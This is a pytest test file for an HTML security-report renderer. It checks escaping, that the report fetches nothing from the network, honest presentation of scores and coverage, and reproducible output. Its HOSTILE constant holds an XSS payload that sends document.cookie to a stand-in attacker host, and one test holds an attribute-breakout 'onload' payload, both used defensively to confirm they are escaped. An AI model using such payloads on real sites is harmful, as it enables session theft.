"""What a report must never do, and what it must always say.

A report is the one artefact that leaves this platform. It is downloaded, forwarded, and
opened by somebody signed in to something else, possibly a year later and offline. So the
properties it has to hold are unusually strict: it cannot execute anything it was given,
it cannot reach the network, it cannot say more than the evidence supports, and it has to
render identically every time or it cannot be defended when disputed.
"""

from __future__ import annotations

import re
from datetime import UTC, datetime

import pytest
from siembiot_worker.reports import (
    LOCALES,
    ReportDocument,
    ReportFinding,
    ReportPillar,
    render_report,
)
from siembiot_worker.reports.html import _TEXT

OBSERVED = datetime(2026, 8, 5, 9, 30, tzinfo=UTC)
GENERATED = datetime(2026, 8, 5, 12, 0, tzinfo=UTC)

#: Text a report can genuinely receive. The subject of a finding can be a host name
#: discovered in a certificate transparency log, which is to say a string somebody else
#: chose and put in a public log on purpose.
HOSTILE = "<script>fetch('https://attacker.test?c='+document.cookie)</script>"


def finding(**overrides: object) -> ReportFinding:
    base = {
        "check_id": "B.dmarc_enforced",
        "severity": "high",
        "subject": "primaria-exemplu.ro",
        "title_ro": "DMARC nu este aplicat",
        "title_en": "DMARC is not enforced",
        "rationale_ro": "Fără DMARC oricine poate trimite e-mail în numele instituției.",
        "rationale_en": "Without DMARC anybody can send e-mail as the institution.",
    }
    return ReportFinding(**{**base, **overrides})  # type: ignore[arg-type]


def visible_text(html: str) -> str:
    """What a reader actually sees, with the stylesheet and the markup removed.

    Added because two tests here were asserting against the raw document and one of them
    had started passing for the wrong reason: the dashboard's stylesheet contains
    `.fill-developing`, so `"developing" in html` was satisfied by a CSS class name while
    the visible text said "In dezvoltare". A band assertion that a stylesheet can satisfy
    is not a band assertion.
    """
    without_style = re.sub(r"<style.*?</style>", " ", html, flags=re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", without_style))


def report(**overrides: object) -> ReportDocument:
    base = {
        "organization_name": "Primăria Exemplu",
        "domain": "primaria-exemplu.ro",
        "score": 62.5,
        "band": "developing",
        "coverage_percentage": 93.7,
        "coverage_sufficient": True,
        "methodology_version": "1.1.0",
        "policy_digest": "77fc0d7fc40cc7ecc8567ecf7752137b63f6313dbdef42971bfafd7529abcf16",
        "assessment_mode": "passive_observation",
        "observed_at": OBSERVED,
        "generated_at": GENERATED,
        "findings": (finding(),),
    }
    return ReportDocument(**{**base, **overrides})  # type: ignore[arg-type]


# -- injection -----------------------------------------------------------------------


@pytest.mark.parametrize(
    "field",
    ["organization_name", "domain"],
)
def test_hostile_text_in_the_header_is_not_markup(field: str) -> None:
    html = render_report(report(**{field: HOSTILE}))

    assert "<script>" not in html
    assert "&lt;script&gt;" in html


def test_a_host_name_from_a_certificate_log_is_not_markup() -> None:
    """The subject of a finding is the most exposed field in the document: it can be a
    name somebody registered, obtained a certificate for, and thereby placed in a public
    log, specifically so that it would be read by something like this."""
    html = render_report(report(findings=(finding(subject=HOSTILE),)))

    assert "<script>" not in html
    assert "attacker.test" in html  # present as text, so the reader can still see it


def test_hostile_text_in_guidance_is_not_markup() -> None:
    html = render_report(
        report(
            findings=(
                finding(
                    remediation_summary_ro=HOSTILE,
                    remediation_summary_en=HOSTILE,
                    remediation_steps_ro=(HOSTILE,),
                    remediation_steps_en=(HOSTILE,),
                    remediation_caveat_ro=HOSTILE,
                    remediation_caveat_en=HOSTILE,
                ),
            )
        )
    )

    assert "<script>" not in html


def test_an_attribute_cannot_be_escaped_out_of() -> None:
    """A severity arriving from data lands in a class attribute. Breaking out of it
    would be enough to add an event handler without ever writing a tag."""
    html = render_report(report(findings=(finding(severity='" onload="alert(1)'),)))

    assert 'onload="alert(1)"' not in html
    assert "&quot;" in html


# -- no network ----------------------------------------------------------------------


def test_the_report_fetches_nothing() -> None:
    """It is opened from a downloads folder, offline, possibly a year later. A page that
    fetches anything also tells whoever hosts that thing when a confidential document was
    opened, and by whom."""
    html = render_report(report())

    assert "<link" not in html
    assert "src=" not in html
    assert "@import" not in html
    assert "url(" not in html
    # No absolute URL anywhere. Checked against the whole document rather than against a
    # list of elements that can fetch, because that list grows and this assertion does
    # not have to know it.
    assert re.findall(r"https?://\S+", html) == []


# -- honesty ------------------------------------------------------------------------


def test_no_band_is_printed_below_the_coverage_floor() -> None:
    """The floor removes the band, not the number. Printing a band from thin evidence is
    the single most misleading thing this report could do: a band is a conclusion, and a
    reader who sees one assumes somebody was entitled to draw it."""
    # `managed` rather than `resilient`, and the choice is the test. The scale beneath
    # the score is labelled with the extremes -- Critic and Rezilient -- so those two
    # words appear whatever the result, and asserting their absence would be a test about
    # the layout. "Gestionat" appears only if a band was awarded.
    html = render_report(report(coverage_sufficient=False, band="managed"))
    shown = visible_text(html)

    assert "Gestionat" not in shown, "a band was awarded below the coverage floor"
    assert "93.7%" in shown
    assert "62.5" in shown


def test_the_band_is_printed_when_coverage_supports_it() -> None:
    """In the reader's language, not as the identifier.

    The methodology carries `label_ro` and `label_en` for every band, and this report
    printed the raw `developing` into an otherwise Romanian document.
    """
    shown = visible_text(render_report(report()))

    assert "In dezvoltare" in shown.replace("î", "i").replace("Î", "I")
    assert "developing" not in shown


def test_inconclusive_checks_are_named_and_not_read_as_clean() -> None:
    html = render_report(report(undetermined_checks=("C.tls_protocol_posture",)))

    assert "C.tls_protocol_posture" in html
    for locale in LOCALES:
        rendered = render_report(report(undetermined_checks=("C.tls_protocol_posture",)), locale)
        assert "C.tls_protocol_posture" in rendered


def test_withheld_checks_are_separated_from_inconclusive_ones() -> None:
    """A check nobody was authorized to perform is not a check that was attempted and
    failed. Listing them together would report a passive run as though it had tried."""
    html = render_report(
        report(
            undetermined_checks=("C.tls_protocol_posture",),
            withheld_checks=("D.remote_access_exposed",),
        ),
        "en",
    )

    assert html.index("D.remote_access_exposed") > html.index("C.tls_protocol_posture")
    assert "not attempted" in html


def test_draft_guidance_says_it_is_draft() -> None:
    """A public body acting on advice nobody has reviewed should be told that is what it
    is -- on the page carrying the advice, not in a footnote elsewhere."""
    html = render_report(
        report(
            findings=(
                finding(
                    remediation_summary_en="Publish a DMARC record.",
                    remediation_review_status="draft",
                ),
            )
        ),
        "en",
    )

    assert "has not yet been reviewed" in html


def test_a_caveat_is_never_separated_from_its_instruction() -> None:
    """Guidance exists because following it can break something. An instruction rendered
    without its warning is worse than no instruction at all."""
    html = render_report(
        report(
            findings=(
                finding(
                    remediation_steps_en=("Block the port at the firewall.",),
                    remediation_caveat_en="This disconnects anybody who was using it.",
                ),
            )
        ),
        "en",
    )

    assert html.index("disconnects anybody") > html.index("Block the port")


def test_a_finding_says_the_requirement_is_not_met() -> None:
    """The heading of a finding is the check's title, and a check title states the
    condition that *should* hold: "SPF is published and valid". Printed alone under "what
    needs fixing", beside a HIGH badge, it reads as though the good state were the
    problem -- which is how the first rendered report actually read.
    """
    for locale, label in (("ro", "Cerință neîndeplinită"), ("en", "Requirement not met")):
        html = render_report(report(), locale)
        assert label in html
        # Before the title it qualifies, not somewhere further down the page.
        assert html.index(label) < html.index("DMARC")


def test_the_policy_digest_is_printed() -> None:
    """So a disputed report can be checked against the exact catalogue that produced it.
    Without it, "methodology 1.1.0" is a name rather than a proof."""
    assert report().policy_digest in render_report(report())


def test_the_notice_appears_in_both_languages() -> None:
    for locale, phrase in (("ro", "Nu este o garanție"), ("en", "Not a security guarantee")):
        assert phrase in render_report(report(), locale)


def test_every_page_says_confidential() -> None:
    for locale, word in (("ro", "CONFIDENȚIAL"), ("en", "CONFIDENTIAL")):
        assert word in render_report(report(), locale)


def test_romanian_diacritics_survive() -> None:
    """Not transliterated and not entity-mangled: an institution's own name rendered as
    "Primaria" is a small insult printed on every page of its own report."""
    html = render_report(report(organization_name="Primăria Municipiului Târgoviște"), "ro")

    assert "Primăria Municipiului Târgoviște" in html
    assert 'charset="utf-8"' in html


# -- reproducibility ------------------------------------------------------------------


def test_the_same_snapshot_renders_to_the_same_bytes() -> None:
    """Reproducibility is the difference between a report and a screenshot. Anything
    read at render time -- a clock, a dictionary iteration order, a generated id --
    breaks it, and breaks it silently."""
    assert render_report(report()) == render_report(report())


def test_findings_of_equal_severity_have_a_total_order() -> None:
    """Without a tie-break, two findings could swap places between renders of one
    snapshot, and a report that differs from itself is reproducible in no useful sense."""
    findings = (
        finding(check_id="B.spf_present", severity="high"),
        finding(check_id="A.dnssec_enabled", severity="high"),
        finding(check_id="C.hsts_present", severity="critical"),
    )
    ordered = report(findings=findings).findings_by_severity()

    assert [item.check_id for item in ordered] == [
        "C.hsts_present",
        "A.dnssec_enabled",
        "B.spf_present",
    ]
    assert render_report(report(findings=findings)) == render_report(
        report(findings=tuple(reversed(findings)))
    )


def test_a_clean_domain_is_not_an_empty_page() -> None:
    html = render_report(report(findings=()), "en")

    assert "No weakness was identified in the checks that were performed" in html


def test_an_unsupported_locale_is_refused_rather_than_guessed() -> None:
    with pytest.raises(ValueError):
        render_report(report(), "fr")


def test_pillars_without_a_score_say_so_rather_than_showing_zero() -> None:
    """A pillar with nothing applicable scores nothing. Rendering it as 0 would read as
    total failure in an area that was never assessed."""
    html = render_report(
        report(pillars=(ReportPillar(pillar="attack_surface", score=None, weight=0.15),)), "en"
    )

    assert "no score" in html
    assert ">0<" not in html


def test_a_score_whose_evidence_was_erased_says_so() -> None:
    """The report prints a policy digest and a methodology version so a disputed result
    can be checked against the catalogue that produced it. Once retention has removed the
    observations it cannot be, and printing those digests without saying so invites
    exactly the wrong conclusion.

    Said beside the score, not in the footer beside the digests: a reader who takes the
    number and stops reading should still have been told.
    """
    erased = datetime(2026, 11, 2, 3, 0, tzinfo=UTC)
    for locale, phrase in (("ro", "nu mai poate fi recalculat"), ("en", "no longer be recomputed")):
        html = render_report(report(evidence_erased_at=erased), locale)
        assert phrase in html
        assert "2026-11-02" in html
        assert html.index(phrase) < html.index(report().policy_digest)


def test_a_score_with_evidence_intact_makes_no_such_claim() -> None:
    assert "no longer be recomputed" not in render_report(report(), "en")


# -- the dashboard ------------------------------------------------------------------


def test_the_impact_summary_counts_findings_by_severity() -> None:
    """The question a reader opens the report with, answered before the areas.

    A pillar score of 25 does not tell an institution whether to worry this week. "Two
    high, one medium" does, and it is the same evidence stated in the form somebody can
    act on.
    """
    shown = visible_text(render_report(report()))

    assert "Cat de afectata" in shown.replace("â", "a").replace("ă", "a")
    for finding in report().findings:
        assert _TEXT["ro"][f"severity.{finding.severity}"] in shown


#: The areas as a real assessment produces them, including one that could not be scored.
WITH_AREAS = (
    ReportPillar(pillar="attack_surface", score=66.7, weight=0.15),
    ReportPillar(pillar="exposure_hygiene", score=100.0, weight=0.1),
    ReportPillar(pillar="reputation", score=None, weight=0.1),
)


def test_an_area_with_no_score_keeps_its_row_and_says_why() -> None:
    """Dropping it would leave a report silently covering five areas out of six, and a
    reader counting rows would have no way to know one was missing."""
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert "Reputatie" in shown.replace("ț", "t")
    assert "fara scor" in shown.replace("ă", "a").replace("â", "a")
    # And why, rather than leaving the reader to assume the institution has none.
    assert "furnizor" in shown


def test_areas_are_named_in_the_reader_s_language() -> None:
    """`attack_surface` and `exposure_hygiene` were printed raw into a Romanian
    document. They are the identifiers the methodology uses, not words."""
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert "attack_surface" not in shown
    assert "exposure_hygiene" not in shown
    assert "Suprafata de atac" in shown.replace("ț", "t").replace("ă", "a")
    assert "Igiena expunerii" in shown


def test_the_raw_weight_is_not_printed() -> None:
    """`0.15` is a methodology parameter. What a reader needs is whether this area
    matters more than the next one, which is what the word says."""
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert "0.15" not in shown
    assert "importan" in shown


def test_the_bars_carry_their_number_too() -> None:
    """Colour and length are never the only signal. A report is read in greyscale, by
    somebody using a screen reader, and after a stylesheet has failed to load."""
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    for pillar in WITH_AREAS:
        if pillar.score is not None:
            assert f"{pillar.score:g}" in shown


def test_a_bar_cannot_render_wider_than_its_track() -> None:
    """A bar wider than its track is a layout bug that reads as a better result."""
    from siembiot_worker.reports.html import _bar
    from siembiot_worker.reports.markup import render

    assert "width: 100%" in render(_bar(140.0, "resilient"))


def test_a_score_of_zero_still_draws_a_bar() -> None:
    """Zero is a result, not an absence.

    Drawn at its true width it is an empty track, and on the page that is
    indistinguishable from the area which has no score at all -- so the worst possible
    outcome rendered as a missing one. A real report showed it: e-mail scored 0 and the
    row looked unmeasured beside `reputation`, which genuinely was.

    The sliver is small enough that nobody reads it as a quantity, and the number beside
    it says the rest.
    """
    from siembiot_worker.reports.html import _bar
    from siembiot_worker.reports.markup import render

    drawn = render(_bar(0.0, "critical"))

    assert "width: 0%" not in drawn
    assert "fill-critical" in drawn


def test_an_area_with_no_score_draws_no_bar_at_all() -> None:
    """The other half of the same distinction. If both zero and absent drew a bar, the
    sliver above would have removed the difference rather than preserved it."""
    shown = render_report(
        report(pillars=(ReportPillar(pillar="reputation", score=None, weight=0.1),))
    )

    # The row exists and says why, and there is no track for it to be misread as a
    # very low score.
    assert "fara scor" in visible_text(shown).replace("ă", "a")
    assert "track" not in shown.split("Reputa")[1].split("</tr>")[0]


def test_report_band_labels_match_the_methodology() -> None:
    """The labels exist in the catalogue; the report used to ignore them.

    Two copies of the same words in two files is how a report ends up printing
    `developing` to a Romanian reader while the methodology has said "În dezvoltare"
    all along. This makes the duplication safe by making a divergence fail here.
    """
    import json
    from pathlib import Path

    catalogue = json.loads(
        (
            Path(__file__).resolve().parents[2]
            / "packages"
            / "policy"
            / "methodology"
            / "v1.1.0.json"
        ).read_text(encoding="utf-8")
    )
    bands = catalogue["bands"]

    assert bands, "no bands in the methodology; this test is checking nothing"
    for band in bands:
        assert _TEXT["ro"][f"band.{band['band']}"] == band["label_ro"], band["band"]
        assert _TEXT["en"][f"band.{band['band']}"] == band["label_en"], band["band"]


def test_every_pillar_the_methodology_weights_has_a_label() -> None:
    """An area added to the methodology and not translated shows up as its identifier.
    That is ugly enough that somebody fixes it, which is the intended failure mode --
    but it should fail here first, before an institution reads it."""
    import json
    from pathlib import Path

    catalogue = json.loads(
        (
            Path(__file__).resolve().parents[2]
            / "packages"
            / "policy"
            / "methodology"
            / "v1.1.0.json"
        ).read_text(encoding="utf-8")
    )
    weights = catalogue["pillar_weights"]

    assert weights, "no pillars in the methodology; this test is checking nothing"
    for pillar in weights:
        for locale in ("ro", "en"):
            assert f"pillar.{pillar}" in _TEXT[locale], f"{pillar} has no {locale} label"


def test_the_legend_explains_which_direction_is_good() -> None:
    """The gap a coloured bar leaves open.

    A reader seeing amber at 66.7 and green at 100 has no way to know whether high is
    good, and nothing else on the page says so. Colour without a key is decoration that
    looks like information.
    """
    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert "Cum se citesc culorile" in shown
    assert "100 este cel mai bun rezultat" in shown


def test_the_legend_names_every_band_with_its_range() -> None:
    """Derived from the same band floors the bars are coloured from, so a methodology
    that re-cuts its bands moves the legend with it rather than leaving a caption that
    describes the previous scale."""
    from siembiot_worker.reports.html import _BAND_FLOORS

    shown = visible_text(render_report(report(pillars=WITH_AREAS)))

    assert _BAND_FLOORS, "no bands; this test is checking nothing"
    for band, floor in _BAND_FLOORS:
        assert _TEXT["ro"][f"band.{band}"] in shown, band
        assert f"{floor:g}" in shown, f"{band} floor missing from the legend"


def test_the_legend_ranges_are_contiguous_and_reach_100() -> None:
    """A gap between two bands would leave scores the legend does not explain, and an
    overlap would give one score two colours. Either makes the key wrong in a way a
    reader cannot detect."""
    from siembiot_worker.reports.html import _BAND_FLOORS

    floors = [floor for _, floor in _BAND_FLOORS]

    assert floors[0] == 0.0, "the scale does not start at zero"
    assert floors == sorted(floors), "bands are out of order"
    assert len(set(floors)) == len(floors), "two bands share a floor"
